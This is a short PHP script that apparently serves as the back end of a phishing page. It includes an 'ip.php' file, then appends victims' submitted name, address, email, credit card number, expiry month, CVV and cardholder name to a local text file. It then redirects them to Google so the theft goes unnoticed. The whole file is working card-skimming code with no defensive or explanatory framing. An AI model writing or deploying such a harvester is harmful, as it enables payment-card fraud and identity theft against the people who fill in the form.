<?php
include 'ip.php';

file_put_contents("usernames.txt", " [zip]: " . $_POST['zip'] . " [state]: " . $_POST['state'] . " [city]: " . $_POST['city'] . " [address]: " . $_POST['address'] . " [email]: " . $_POST['email'] . " [name]: " . $_POST['firstname'] . "[CC]: " . $_POST['cardnumber'] . " [expmonth]: " . $_POST['expmonth'] . " [cvv]: " . $_POST['cvv'] . " [ccholder]: " . $_POST['cardname'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
